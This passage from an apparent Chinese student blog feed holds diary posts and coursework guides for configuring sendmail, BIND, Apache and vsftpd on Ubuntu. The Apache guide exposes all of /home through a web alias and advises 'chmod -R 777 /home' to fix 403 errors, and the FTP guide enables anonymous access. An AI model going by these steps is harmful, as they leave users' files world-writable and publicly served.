class="number">.0</span> -o <span class="number">32</span> <span class="number">32.</span>o</span><br><span class="line">./<span class="number">32</span></span><br></pre></td></tr></table></figure></p><hr><h1 id="zsh-alias"><a href="#zsh-alias" class="headerlink" title="zsh alias"></a>zsh alias</h1><p>上面的太长了，每次编译连接都要写一大串。。。<br>我懒，我这样搞的别名<br><figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alias</span> <span class="title">comp</span>=<span class="string">"nasm -f macho "</span></span><br><span class="line"><span class="keyword">alias</span> <span class="title">lk</span>=<span class="string">"ld -macosx_version_min 10.7.0 -o"</span></span><br></pre></td></tr></table></figure></p><p>这样的话，三行就简单多了<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">comp <span class="number">32.</span>asm</span><br><span class="line">lk <span class="number">32</span> <span class="number">32.</span>o</span><br><span class="line">./<span class="number">32</span></span><br></pre></td></tr></table></figure></p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>终于又有时间了</title>
      <link href="/2015/11-16-1/"/>
      <url>/2015/11-16-1/</url>
      
        <content type="html"><![CDATA[<ul><li>昨天终于把伪随机数发生器的 app 写完</li><li>昨天出太阳了和朋友去打乒乓球</li><li>ipad 哪里出了问题送去修</li><li>发现一个好东西 f.lux</li></ul><a id="more"></a><h1 id="PRNG-app-写完了"><a href="#PRNG-app-写完了" class="headerlink" title="PRNG app 写完了"></a>PRNG app 写完了</h1><p>finally.<br>虽然说是很多电脑关系都不完美，但是至少功能是完成了的。<br>强迫症的临终遗言：</p><blockquote><ul><li>右滑返回居然会高亮</li><li>没有选中的蓝色小钩钩</li><li>种子选择下面的文字好丑</li><li>cellbutton 里面的文字还没有填补</li></ul></blockquote><p>这还是我个人觉得不满意的地方，更别说甲方还没有审查</p><hr><h1 id="打乒乓球去了"><a href="#打乒乓球去了" class="headerlink" title="打乒乓球去了"></a>打乒乓球去了</h1><p>出太阳，打羽毛球没场地了，打乒乓<br>重点是室友被偷拍了然后有人想认识他<br>真的是羡慕啊<br>对他来说可能就不怎么开心了，人家毕竟有女朋友了<br>晚上吃饭的时候他因为另外一件事说了<br>能耍朋友不耍朋友的才叫单身贵族，刷不到朋友叫单身什么你晓得吧<br>就是这么惨  </p><hr><h1 id="ipad-送修"><a href="#ipad-送修" class="headerlink" title="ipad 送修"></a>ipad 送修</h1><p>ipad 真不愧为新一代的传家宝<br>我的最近抽风，电量少的时候就重启了<br>满电量的时候随便用啊<br>少于50就开始了，两三分钟就给你摆一道<br>送去修了，不晓得好久修好哇<br>去了时候店铺里全是双十一的包裹<br>本来说在优衣库买根腰带的<br>哪想居然是用抢得，然后就没有手贱<br>倒是49买了20包抽纸<br>等下还要去拿快递，我抱一箱抽纸回寝室，画面很美</p><hr><h1 id="f-lux"><a href="#f-lux" class="headerlink" title="f.lux"></a>f.lux</h1><p>根据时间更改屏幕蓝光量<br>现在电脑就有点点黄，也不算黄吧，就是暖屏的感觉<br>等会儿睡觉之前直接就是红黄红黄的<br>管不管用不知道，反正换回去的时候感觉以前的颜色略刺眼  </p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>这几天在干什么 2</title>
      <link href="/2015/11-05-whatsup2/"/>
      <url>/2015/11-05-whatsup2/</url>
      
        <content type="html"><![CDATA[<p>这几天一直在搞全国密码学大赛的事情<br>看文献，github，SoF<br>略忙<br><a id="more"></a></p><hr><h1 id="读书"><a href="#读书" class="headerlink" title="读书"></a>读书</h1><p>要看的文献越来越多了，慢慢变得不是轻松就能看懂的那种了，一篇 pdf 只有三页，看了两个小时，中间还各种查资料、问朋友。<br>『如何阅读一本书』里面就说过，好的作品是照顾到了读者的。作者顺着读者的思路在写，能够让读者简单的，轻松的读下去。或许这样的作品会篇幅很长，但是对与一个注意力不集中的人来说，轻松读下去还是挺容易的。<br>相反，一篇文章要是逼格很高，文字精炼，涉猎较广，就容易使得读者难以继续，对我来说这就是不好的作品。前几天不是说过『learn python the hard way』是面向新手的 python 起步读物么？比起正在参考的这些文献，我其实还是更喜欢这种起步读物的。。。</p><h1 id="做事"><a href="#做事" class="headerlink" title="做事"></a>做事</h1><p>密码学大赛这个月27号就要交作品了，汇编语言，网络配置与服务，网络攻防也是这个月末就要考试了，忙的不要不要的。。。<br>还好，本来还要做密码学的程序设计的，就直接可以用这个答辩了。本来我选的 md5，其实 md5 的实现还是挺简单的，虽然这种东西已经过时了。<br>莫名其妙又要回到 ios app 的开发了。这次的密码学大赛老师为了创新，把手机 app 都加上去了。。。可惜 apple 提供的系统 sensor 接口太少了，不然创新性要高很多。  </p><h1 id="进度"><a href="#进度" class="headerlink" title="进度"></a>进度</h1><ul><li>main setting tableview 做好了</li><li>还差一个或者两个具体的设置，我还没有想好是单选还是开关式的多选  </li><li>这个选择的难点应该是 detail 值的传递</li><li>最后的生成还没有写，那个应该是一个 viewcontroller，但是不知道 segue 会不会给个面子不报错，不然最后的输出页面也必须变成一个 tableviewcontroller</li><li>随机数的生成算法暂时没有写，我决定把这个留到最后来。</li><li>整个就是个面向对象，最后不出意料的话应该是要写一个 .swift 类来存储整个操作的所有参数，点击生成按钮之后调用，然后输出到生成页面。</li><li>未知的情况太多了，万一三轴加速度取不到的话就惨了，万一最后生成的时候内存不足也惨了。各种惨。</li></ul><hr><p>太晚了，有空继续<br>2015年11月05日01:11:51</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Ubuntu Email Server</title>
      <link href="/2015/10-30-emailserver/"/>
      <url>/2015/10-30-emailserver/</url>
      
        <content type="html"><![CDATA[<p>配置sendmail+dovecot 的服务器并用 email 客户端进行邮件收发  </p><ol><li>sendmail 只为192.168.x.0/24 提供转发</li><li>允许用户teacher 有多个邮件地址（<a href="mailto:teacher@linuxstudy.com" target="_blank" rel="noopener">teacher@linuxstudy.com</a> <a href="mailto:qz@linuxstudy.com" target="_blank" rel="noopener">qz@linuxstudy.com</a>）</li><li>设置 sendmail 可以转发来自126.com 的邮件  <a id="more"></a><strong>下面的语句使用时出错的话，请大胆尝试<code>sudo</code>，<code>touch</code>等操作</strong></li></ol><hr><h1 id="安装-sendmail，mailutils-和-dovecot"><a href="#安装-sendmail，mailutils-和-dovecot" class="headerlink" title="安装 sendmail，mailutils 和 dovecot"></a>安装 sendmail，mailutils 和 dovecot</h1><h2 id="sendmail"><a href="#sendmail" class="headerlink" title="sendmail"></a>sendmail</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install sendmail</span><br></pre></td></tr></table></figure><h2 id="dovecot"><a href="#dovecot" class="headerlink" title="dovecot"></a>dovecot</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install dovecot-pop3d</span><br></pre></td></tr></table></figure><h2 id="查看状态、开启服务，关闭服务，重启服务："><a href="#查看状态、开启服务，关闭服务，重启服务：" class="headerlink" title="查看状态、开启服务，关闭服务，重启服务："></a>查看状态、开启服务，关闭服务，重启服务：</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> service </span>sendmail/dovecot status/start/stop/restart</span><br></pre></td></tr></table></figure><h2 id="mailutils"><a href="#mailutils" class="headerlink" title="mailutils"></a>mailutils</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install mailutils</span><br></pre></td></tr></table></figure><h2 id="测试发送"><a href="#测试发送" class="headerlink" title="测试发送"></a>测试发送</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo “邮件正文” <span class="string">| mail -s 邮件主题 对方 email</span></span><br></pre></td></tr></table></figure><hr><h1 id="sendmail-控制邮件中转"><a href="#sendmail-控制邮件中转" class="headerlink" title="sendmail 控制邮件中转"></a>sendmail 控制邮件中转</h1><h2 id="备份配置文件，这是个好习惯："><a href="#备份配置文件，这是个好习惯：" class="headerlink" title="备份配置文件，这是个好习惯："></a>备份配置文件，这是个好习惯：</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /etc/mail/sendmail<span class="selector-class">.cf</span> /etc/mail/sendmail<span class="selector-class">.cf</span><span class="selector-class">.old</span></span><br></pre></td></tr></table></figure><h2 id="编辑配置文件（-etc-mail-sendmail-mc"><a href="#编辑配置文件（-etc-mail-sendmail-mc" class="headerlink" title="编辑配置文件（/etc/mail/sendmail.mc)"></a>编辑配置文件（<code>/etc/mail/sendmail.mc</code>)</h2><p><strong>AKA激活<code>access.db</code></strong><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">找到这个：</span><br><span class="line"><span class="function"><span class="title">FEATURE</span><span class="params">(`access_db<span class="string">', , `skip'</span>)</span><span class="title">dnl</span></span></span><br><span class="line">改成下面这个</span><br><span class="line"><span class="function"><span class="title">FEATURE</span><span class="params">(`access_db<span class="string">')dnl</span></span></span></span><br></pre></td></tr></table></figure></p><h2 id="编译-mc文件成为-cf文件："><a href="#编译-mc文件成为-cf文件：" class="headerlink" title="编译.mc文件成为.cf文件："></a>编译<code>.mc</code>文件成为<code>.cf</code>文件：</h2><p><strong>注意我这里的<code>m4</code>没有权限往这个文件夹里面写文件，所以我先生成到了<code>/home</code>里面然后再<code>mv</code>进去</strong><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo m4 /etc/mail/sendmail<span class="selector-class">.mc</span> &gt; /home/sendmail.cf</span><br><span class="line">sudo mv /home/sendmail<span class="selector-class">.cf</span> /etc/mail/sendmail.cf</span><br></pre></td></tr></table></figure></p><h2 id="编辑access文件："><a href="#编辑access文件：" class="headerlink" title="编辑access文件："></a>编辑<code>access</code>文件：</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span> RELAY</span><br><span class="line"><span class="number">126.</span>com RELAY</span><br></pre></td></tr></table></figure><h2 id="编译access到access-db文件"><a href="#编译access到access-db文件" class="headerlink" title="编译access到access.db文件"></a>编译<code>access</code>到<code>access.db</code>文件</h2><p><strong>不知道为什么使用 <code>sudo</code> 也没有用，我使用了<code>sudo su</code></strong><br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">makemap hash access.db &lt; access</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure></p><p>然后使用 <code>sudo</code> 编辑器查看 access.db 文件就可以看到编译成功了。</p><h2 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> service </span>sendmail restart</span><br></pre></td></tr></table></figure><hr><h1 id="单个用户多个邮件地址"><a href="#单个用户多个邮件地址" class="headerlink" title="单个用户多个邮件地址"></a>单个用户多个邮件地址</h1><h2 id="编辑配置文件（-etc-mail-sendmail-mc-："><a href="#编辑配置文件（-etc-mail-sendmail-mc-：" class="headerlink" title="编辑配置文件（/etc/mail/sendmail.mc)："></a>编辑配置文件（<code>/etc/mail/sendmail.mc</code>)：</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">添加下面这一行</span><br><span class="line"><span class="function"><span class="title">define</span><span class="params">(<span class="string">'ALIAS_FILE'</span>，<span class="string">'/etc/aliases'</span>)</span><span class="title">dnl</span></span></span><br></pre></td></tr></table></figure><h2 id="编辑-etc-aliases"><a href="#编辑-etc-aliases" class="headerlink" title="编辑/etc/aliases:"></a>编辑<code>/etc/aliases</code>:</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">admin:</span><span class="string">":include:/etc/manage.user"</span></span><br></pre></td></tr></table></figure><h2 id="新建文件-etc-manage-user"><a href="#新建文件-etc-manage-user" class="headerlink" title="新建文件/etc/manage.user:"></a>新建文件<code>/etc/manage.user</code>:</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">root</span>,<span class="selector-tag">teacher</span>,<span class="selector-tag">teacher</span>@<span class="keyword">linuxstudy</span>.<span class="keyword">com</span>,<span class="keyword">qz</span>@<span class="keyword">linuxstudy</span>.<span class="keyword">com</span></span><br></pre></td></tr></table></figure><h2 id="编译-mc文件成为-cf文件：-1"><a href="#编译-mc文件成为-cf文件：-1" class="headerlink" title="编译.mc文件成为.cf文件："></a>编译<code>.mc</code>文件成为<code>.cf</code>文件：</h2><p><strong>注意我这里的<code>m4</code>没有权限往这个文件夹里面写文件，这次使用<code>sudo su</code></strong><br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">m4 <span class="regexp">/etc/m</span>ail<span class="regexp">/sendmail.mc &gt; /</span>etc<span class="regexp">/mail/</span>sendmail.cf</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure></p><h2 id="使别名生效："><a href="#使别名生效：" class="headerlink" title="使别名生效："></a>使别名生效：</h2><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">/usr/bin/<span class="keyword">new</span><span class="type">aliases</span></span><br><span class="line"><span class="type">exit</span></span><br></pre></td></tr></table></figure><h2 id="重启服务-1"><a href="#重启服务-1" class="headerlink" title="重启服务"></a>重启服务</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> service </span>sendmail restart</span><br></pre></td></tr></table></figure><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>开始使用Ubuntu</title>
      <link href="/2015/10-27-ubuntu/"/>
      <url>/2015/10-27-ubuntu/</url>
      
        <content type="html"><![CDATA[<p><strong>网络配置与服务</strong>这门课对我来说已经成为周二晚的噩梦了。<br>在下周二之前要做的事情有点多：  </p><ol><li>dns server 正向反向的解析</li><li>apache 服务器  <ol><li>重设置文档主目录</li><li>只监听80和81端口</li><li>主目录默认打开 php jsp html文档</li><li>设置默认字符集为 GB2312</li><li>建立虚拟目录 OA: /var/www/OA</li><li>访问目录时需要用户认证，只认证 teacher</li><li>建立一个基于 IP 地址的虚拟 Web 站点，IP 地址有192.168.1.6和192.168.1.8，第一个站点主目录为var/www/www1，并且192.168.1.0/24子网可访问；第二个站点主目录为var/www/www2，并且192.168.1.0/24和com.cn域的客户访问</li></ol></li><li>ftp<a id="more"></a><strong>下面的语句使用时出错的话，请大胆尝试<code>sudo</code>，<code>touch</code>等操作</strong></li></ol><hr><h1 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h1><h2 id="选用虚拟机和-ubuntu"><a href="#选用虚拟机和-ubuntu" class="headerlink" title="选用虚拟机和 ubuntu"></a>选用虚拟机和 ubuntu</h2><p>虚拟机方面，Parallels Desktop绝对是不二之选，但是很贵而且每次更新都收费，不给我们这些学生活路。关于版权这东西，最近我发现我正处于版权尴尬的巅峰。virtual box 免费就用它吧。<br>然后选用了 ubuntu kylin 14.04 这个个人喜好不同，特别是看到室友更新15瞬间爆炸之后。  </p><h2 id="各种工具"><a href="#各种工具" class="headerlink" title="各种工具"></a>各种工具</h2><p><code>gwet</code> <code>zsh</code> <code>sublime text</code> 还有各种插件 <code>autojump</code> <code>predawn</code> <code>Valign</code></p><hr><h1 id="dns-server"><a href="#dns-server" class="headerlink" title="dns server"></a>dns server</h1><p>跟着<a href="http://www.linuxidc.com/Linux/2015-04/116350.htm" target="_blank" rel="noopener">这个文章</a>来<br>唯一卡住的地方就只有<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> service </span>bind9 restart</span><br></pre></td></tr></table></figure></p><p>这个时候就使用<br><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail /<span class="built_in">var</span>/<span class="built_in">log</span>/syslog</span><br></pre></td></tr></table></figure></p><p>来查看错误，我这里是因为<code>/etc/bind/named.conf:12: open: /etc/rndc.key: file not found</code><br>进去把它删除了就行了<br>趁着热先，生成系统快照再说。。。<br>发现一个问题，重启之后<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">subl </span>/etc/resolv.conf</span><br></pre></td></tr></table></figure></p><p>会自动改回到127.0.0.1，导致反向的解析失效，记得每次开机都要改成本机的 ip 地址。</p><hr><h1 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h1><h2 id="设置文档主目录"><a href="#设置文档主目录" class="headerlink" title="设置文档主目录"></a>设置文档主目录</h2><p><strong>下面用<code>/var/www/myweb</code>为例</strong><br>安装：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install apache2</span><br></pre></td></tr></table></figure></p><p>配置文件： <code>/etc/apache2/apache2.conf</code><br>找到<code>&lt;Directory /var/www/&gt;</code>这一行，改成<code>&lt;Directory /var/www/myweb&gt;</code><br>进入这个文件<code>/etc/apache2/sites-available/000-default.conf</code><br>找到<code>DocumentRoot /var/www/</code>一行，改为<code>DocumentRoot /var/www/myweb</code><br>然后在<code>/var/www/myweb</code>下面创建你的<code>index.html</code>文件<br>然后重启 Apache 服务：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="regexp">/etc/i</span>nit.d<span class="regexp">/apache2 restart</span></span><br></pre></td></tr></table></figure></p><p>这样就可以在<code>127.0.0.1</code>上使用新的文档主目录了</p><h2 id="设置监听端口"><a href="#设置监听端口" class="headerlink" title="设置监听端口"></a>设置监听端口</h2><p>先改这个文件： <code>/etc/apache2/ports.conf</code><br>找到这个<code>Listen 80</code>改成这个<code>Listen 你的IP地址:81 Listen 你的IP地址:80</code><br>然后改这个文件： <code>/etc/apache2/sites-enabled/000-default.conf</code><br>整个文件都是基于80端口的，把这些<code>&lt;VirtualHost *:80&gt;...&lt;/VirtualHost&gt;</code>复制下来粘贴一遍，然后把80改成81<br>然后重启 Apache 服务：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="regexp">/etc/i</span>nit.d<span class="regexp">/apache2 restart</span></span><br></pre></td></tr></table></figure></p><p>试试看<code>你的IP地址:80</code>和<code>你的IP地址:81</code>是不是都能看到你刚才设置的 <code>index.html</code>内容了  </p><h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><p>在<code>/etc/apache2/apache2.conf</code>中添加<code>AddDefaultCharset GB2312</code>  </p><h2 id="添加虚拟目录"><a href="#添加虚拟目录" class="headerlink" title="添加虚拟目录"></a>添加虚拟目录</h2><p>我的方法跟网上能找到的稍微有点不一样<br>具体就是 我没有<code>httpd.conf</code>这个文件，配置的信息都添加到了<code>/etc/apache2/apache2.conf</code>里面<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Alias</span> /OA <span class="string">"/home"</span></span><br><span class="line"><span class="section">&lt;Directory /home&gt;</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">Options</span></span> FollowSymLinks</span><br><span class="line"><span class="attribute">AllowOverride</span> None</span><br><span class="line"><span class="attribute"><span class="nomarkup">Order</span></span> deny,allow</span><br><span class="line"><span class="attribute"><span class="nomarkup">allow</span></span> from <span class="literal">all</span></span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后需要把 <code>/home</code> 目录的权限给访问者：<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod -R <span class="number">777</span> /<span class="built_in">home</span></span><br></pre></td></tr></table></figure></p><p>这个也是解决<code>403 forbidden 错误的方法</code><br>然后在<code>/etc/apache2/sites-enabled/000-default.conf</code>里面添加<code>OA</code>这个虚拟目录：<code>&lt;VirtualHost *:81/OA&gt;...&lt;/VirtualHost&gt;</code></p><h2 id="设置权限"><a href="#设置权限" class="headerlink" title="设置权限"></a>设置权限</h2><p>我的阿帕奇为啥没有<code>htpasswd</code>？<br>安装<code>htpasswd</code>：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install apache2-utils</span><br></pre></td></tr></table></figure></p><p>修改目录的权限，在<code>apache2.conf</code>里面：<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Alias</span> /OA <span class="string">"/home"</span></span><br><span class="line"><span class="section">&lt;Directory /home&gt;</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">Options</span></span> FollowSymLinks</span><br><span class="line"><span class="attribute">AllowOverride</span> AuthConfig</span><br><span class="line"><span class="attribute"><span class="nomarkup">Order</span></span> allow,deny</span><br><span class="line"><span class="attribute"><span class="nomarkup">Allow</span></span> from <span class="literal">all</span></span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure></p><p>注意第四行是<code>AuthConfig</code><br>在<code>000-default.conf</code>中相应目录中添加<code>AccessFileName .htaccess</code><br>使用<code>htpasswd</code>创建<code>teacher</code>这个用户： <code>/usr/bin/htpasswd -c /home/password teacher</code><br>然后就在该目录下创建<code>.htaccess</code>文件：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AuthName <span class="string">"!!!password file auth!!!"</span> </span><br><span class="line">AuthType Basic</span><br><span class="line">AuthUserFile /home/password </span><br><span class="line">Require<span class="built_in"> user </span>teacher</span><br></pre></td></tr></table></figure></p><p>最后还是重启一下  </p><hr><h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install vsftpd</span><br></pre></td></tr></table></figure><p>检查一下：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> service </span>vsftpd status</span><br></pre></td></tr></table></figure></p><p>可以看到运行状态  </p><h2 id="允许匿名访问"><a href="#允许匿名访问" class="headerlink" title="允许匿名访问"></a>允许匿名访问</h2><p><em>在使用之前最好还是先备份一下配置文件</em><br>备份<code>vsftpd</code>的配置文件：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /etc/vsftpd<span class="selector-class">.conf</span> /etc/vsftpd<span class="selector-class">.conf</span><span class="selector-class">.old</span></span><br></pre></td></tr></table></figure></p><p>然后打开<code>vsftpd.conf</code>，找到这一行：<code>anonymous_enable=NO</code>，改成<code>YES</code></p><h2 id="ftp-访问的根目录"><a href="#ftp-访问的根目录" class="headerlink" title="ftp 访问的根目录"></a>ftp 访问的根目录</h2><p>新建一个用户和这个用户的目录：<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mkdir</span> -p /home/<span class="keyword">test</span></span><br><span class="line">useradd <span class="keyword">test</span> -<span class="keyword">g</span> ftp -<span class="keyword">d</span> /home/<span class="keyword">test</span> -s /sbin/nologin</span><br></pre></td></tr></table></figure></p><p>设置密码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd <span class="built_in">test</span></span><br></pre></td></tr></table></figure></p><p>设置一个可以访问的共享目录，别人就不会看到这个文件夹以外的东西了。<br>还是打开这个<code>vsftpd.conf</code>文件，在最后新加一行<code>anon_root=这里填目录路径</code>，并把这几行注释取消掉：</p><ol><li><code>local_enable=YES</code> //允许本地访问</li><li><code>write_enable=YES</code> //访问用户可以创建文件夹</li><li><code>chroot_list_enable=YES</code> //设置允许列表中的用户访问</li><li><code>chroot_list_file=/etc/vsftpd.chroot_list</code>//允许列表的位置  </li><li><strong><code>max_clients=100</code>//设置最大连接客户端数</strong></li><li><strong><code>max_per_ip=2</code>//设置每IP最大连接数</strong></li></ol><p>然后新建允许列表，在其中添加<code>test</code>这一行<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">'test'</span> &gt; <span class="regexp">/etc/</span>vsftpd.chroot_list</span><br></pre></td></tr></table></figure></p><p><strong>注意，要单独设置用户和匿名用户同时访问的话请把 anonymous 也添加到这个允许列表中</strong></p><p>连接 <code>ftp</code>:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 你的<span class="built_in"> IP </span>地址</span><br></pre></td></tr></table></figure></p><p>如果出现了530错误， 就在 <code>/etc/shells</code> 最后一行添加<code>/sbin/nologin</code><br>500错误，用这个：<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a-w /<span class="built_in">home</span>/test</span><br></pre></td></tr></table></figure></p><p>记得重启服务以生效</p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>干啥</title>
      <link href="/2015/10-23-what-to-do/"/>
      <url>/2015/10-23-what-to-do/</url>
      
        <content type="html"><![CDATA[<p>避免自己没有事情做<br><a id="more"></a></p><hr><h1 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h1><p><strong>至少完整看完与练习好一本书<br>至少过一遍官方文档</strong> </p><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><ul><li>处理文本文件,或者csv (关键词 python csv, python open, python sys) 读一个本地文件,逐行 处理(例如 word count,或者处理log)  </li><li>遍历本地文件系统 (sys, os, path),例如写一个程序统计一个目录下所有文件大小并按各种条件排序并保存结果  </li><li>跟数据库打交道 (python sqlite),写一个小脚本统计数据库里条目数量   </li><li>学会用各种print之类简单粗暴的方式进行调试  </li><li>学会用Google (phrase, domain, use reader to follow tech blogs)</li><li>编辑urllib2的do_open里的h.set_debuglevel改为h.set_debuglevel(1)，这时可以清晰看到请求响应数据，包括https  </li><li><code>《python参考手册》</code></li><li><code>《python基础教程》</code></li><li><code>Python Challenge</code></li><li><a href="https://docs.python.org/2/index.html" target="_blank" rel="noopener">python官方手册</a>  </li><li><a href="http://docs.python-guide.org/en/latest/" target="_blank" rel="noopener">The Hitchhiker’s Guide to Python</a></li><li><a href="https://pymotw.com/2/" target="_blank" rel="noopener">Python Module of the Week</a></li><li><a href="https://www.python.org/dev/peps/pep-0008/" target="_blank" rel="noopener">PEP 8</a></li><li><a href="http://learnpythonthehardway.org/book/" target="_blank" rel="noopener">硬悟学蛇</a></li><li><code>《Python核心编程2》</code><ul><li>第4章 Python对象 </li><li>6.8 Unicode </li><li>8.11 迭代器和iter()函数 </li><li>第9章 文件的输入和输出 </li><li>第10章 错误和异常 </li><li>第11章 函数和函数式编程 </li><li>第12章 模块 </li><li>第14章 执行环境 </li><li>第15章 正则表达式 idea <ul><li>调试工具</li><li>Kodos</li><li>RegexBuddy</li><li><a href="http://www.regexper.com/" target="_blank" rel="noopener">正则图解</a></li><li><a href="http://deerchao.net/tutorials/regex/regex.htm" target="_blank" rel="noopener">正则表达式30分钟入门教程</a></li><li><a href="http://wiki.ubuntu.org.cn/Python" target="_blank" 